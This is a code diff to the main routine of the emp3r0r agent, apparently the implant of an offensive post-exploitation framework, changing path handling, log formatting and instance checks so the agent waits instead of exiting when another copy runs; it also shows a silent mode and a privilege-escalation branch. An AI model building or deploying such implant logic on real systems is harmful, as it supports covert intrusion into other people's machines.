@@ -60,14 +60,24 @@ func main() {
 		}
 	}
 
+	// use absolute path
+	pwd, err := os.Getwd()
+	if err == nil {
+		emp3r0r_data.AgentRoot = pwd + "/" + emp3r0r_data.AgentRoot
+		emp3r0r_data.UtilsPath = pwd + "/" + emp3r0r_data.UtilsPath
+	}
+
 	// silent switch
 	log.SetOutput(ioutil.Discard)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
 	if !*silent {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
 
 		// redirect everything to log file
-		f, err := os.OpenFile(emp3r0r_data.AgentRoot+"/emp3r0r.log", os.O_RDWR|os.O_CREATE, 0600)
+		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
+			emp3r0r_data.AgentRoot),
+			os.O_RDWR|os.O_CREATE, 0600)
 		if err != nil {
 			log.Fatalf("error opening emp3r0r.log: %v", err)
 		}
@@ -118,6 +128,7 @@ func main() {
 	}
 
 	// if the agent's process name is not "emp3r0r"
+test_agent:
 	alive, pid := agent.IsAgentRunningPID()
 	if alive {
 		proc, err := os.FindProcess(pid)
@@ -130,7 +141,12 @@ func main() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !*replace {
-				log.Fatal("Agent is already running and responsive, aborting")
+				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
+					os.Getppid(),
+					os.Getpid())
+
+				util.TakeASnap()
+				goto test_agent
 			}
 		}
 
